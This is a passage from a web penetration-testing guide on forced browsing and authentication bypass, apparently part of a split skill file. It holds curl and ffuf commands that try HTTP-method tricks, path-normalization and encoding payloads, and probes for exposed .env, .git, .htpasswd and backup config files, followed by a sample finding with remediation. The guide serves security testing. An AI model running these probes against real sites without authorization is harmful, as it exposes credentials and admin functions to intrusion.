# bypassing-authentication-with-forced-browsing — 详细参考（由 SKILL.md 拆分）

# Test different HTTP methods on protected endpoints
for method in GET POST PUT DELETE PATCH OPTIONS HEAD TRACE; do
  echo -n "$method: "
  curl -s -o /dev/null -w "%{http_code}" \
    -X "$method" "https://target.example.com/admin/settings"
done

# Test HTTP method override headers
curl -s -o /dev/null -w "%{http_code}" \
  -X POST \
  -H "X-HTTP-Method-Override: GET" \
  "https://target.example.com/admin/settings"

curl -s -o /dev/null -w "%{http_code}" \
  -H "X-Original-Method: GET" \
  -H "X-Rewrite-URL: /admin/settings" \
  "https://target.example.com/"
```

### Step 5: Test Path Traversal and URL Normalization Bypass

Exploit URL parsing differences to bypass path-based authentication rules.

```bash
# Path normalization bypass attempts
curl -s -o /dev/null -w "%{http_code}" "https://target.example.com/admin/dashboard"
curl -s -o /dev/null -w "%{http_code}" "https://target.example.com/ADMIN/dashboard"
curl -s -o /dev/null -w "%{http_code}" "https://target.example.com/admin/./dashboard"
curl -s -o /dev/null -w "%{http_code}" "https://target.example.com/public/../admin/dashboard"
curl -s -o /dev/null -w "%{http_code}" "https://target.example.com/admin%2fdashboard"
curl -s -o /dev/null -w "%{http_code}" "https://target.example.com/;/admin/dashboard"
curl -s -o /dev/null -w "%{http_code}" "https://target.example.com/admin;anything/dashboard"
curl -s -o /dev/null -w "%{http_code}" "https://target.example.com/.;/admin/dashboard"

# Double URL encoding
curl -s -o /dev/null -w "%{http_code}" "https://target.example.com/%2561dmin/dashboard"

# Trailing characters
curl -s -o /dev/null -w "%{http_code}" "https://target.example.com/admin/dashboard/"
curl -s -o /dev/null -w "%{http_code}" "https://target.example.com/admin/dashboard.json"
curl -s -o /dev/null -w "%{http_code}" "https://target.example.com/admin/dashboard%00"
```

### Step 6: Discover Backup and Configuration Files

Search for sensitive files inadvertently exposed on the web server.

```bash
# Backup file discovery
ffuf -u https://target.example.com/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt \
  -e .bak,.old,.orig,.save,.swp,.tmp,.dist,.config,.sql,.gz,.tar,.zip \
  -mc 200 -t 50 -rate 100

# Common sensitive files
for file in .env .git/config .git/HEAD .svn/entries \
  web.config wp-config.php.bak config.php.old \
  database.yml .htpasswd server-status phpinfo.php \
  robots.txt sitemap.xml crossdomain.xml; do
  status=$(curl -s -o /dev/null -w "%{http_code}" \
    "https://target.example.com/$file")
  if [ "$status" != "404" ]; then
    echo "FOUND ($status): $file"
  fi
done

# Git repository exposure check
curl -s "https://target.example.com/.git/HEAD"
# If this returns "ref: refs/heads/main", the git repo is exposed
```

## Key Concepts

| Concept | Description |
|---------|-------------|
| **Forced Browsing** | Directly accessing URLs that are not linked but exist on the server |
| **Directory Enumeration** | Brute-forcing directory and file names against a wordlist to discover hidden content |
| **Authentication Bypass** | Accessing protected resources without valid credentials due to missing access checks |
| **Path Normalization** | Exploiting differences in how web servers and application frameworks parse URL paths |
| **Method-based Bypass** | Using alternative HTTP methods (PUT, DELETE) that may not have authentication checks |
| **Information Disclosure** | Exposure of sensitive configuration files, backups, or debug interfaces |
| **Defense in Depth** | Layered security controls where authentication is enforced at multiple levels |

## Tools & Systems

| Tool | Purpose |
|------|---------|
| **ffuf** | Fast web fuzzer for directory, file, and parameter enumeration |
| **Gobuster** | Directory and DNS brute-forcing tool written in Go |
| **Feroxbuster** | Recursive content discovery tool with automatic recursion |
| **DirBuster** | OWASP Java-based directory brute-force tool with GUI |
| **Burp Suite** | HTTP proxy for request interception and automated scanning |
| **SecLists** | Comprehensive collection of wordlists for security testing |

## Common Scenarios

### Scenario 1: Exposed Admin Panel
An admin panel at `/admin/` is only hidden by not being linked in the navigation. Direct URL access reveals the full administrative interface without any authentication check.

### Scenario 2: Unprotected API Endpoints
API endpoints at `/api/v1/users` and `/api/v1/settings` require authentication in the frontend application but the backend API does not enforce session validation, allowing unauthenticated direct access.

### Scenario 3: Backup File Containing Credentials
A developer left `config.php.bak` on the production server. This backup file contains database credentials in plaintext, discovered through extension-based enumeration.

### Scenario 4: Spring Boot Actuator Exposure
The `/actuator/env` endpoint is exposed without authentication, revealing environment variables including database connection strings, API keys, and secrets.

## Output Format

```
## Forced Browsing / Authentication Bypass Finding

**Vulnerability**: Missing Authentication on Administrative Interface
**Severity**: Critical (CVSS 9.1)
**Location**: /admin/dashboard (GET, no authentication required)
**OWASP Category**: A01:2021 - Broken Access Control

### Discovered Unprotected Resources
| Path | Status | Auth Required | Content |
|------|--------|---------------|---------|
| /admin/dashboard | 200 | No | Full admin panel |
| /admin/users | 200 | No | User management |
| /actuator/env | 200 | No | Environment variables |
| /config.php.bak | 200 | No | Database credentials |
| /.git/HEAD | 200 | No | Git repository metadata |

### Impact
- Unauthenticated access to administrative functions
- Ability to create, modify, and delete user accounts
- Exposure of database credentials and API keys
- Full source code disclosure via exposed Git repository

### Recommendation
1. Implement authentication checks at the server/middleware level for all admin routes
2. Remove backup files, debug endpoints, and version control metadata from production
3. Configure web server to deny access to sensitive file extensions (.bak, .old, .env, .git)
4. Implement IP-based access restrictions for administrative interfaces
5. Use a reverse proxy to restrict access to internal-only endpoints
```
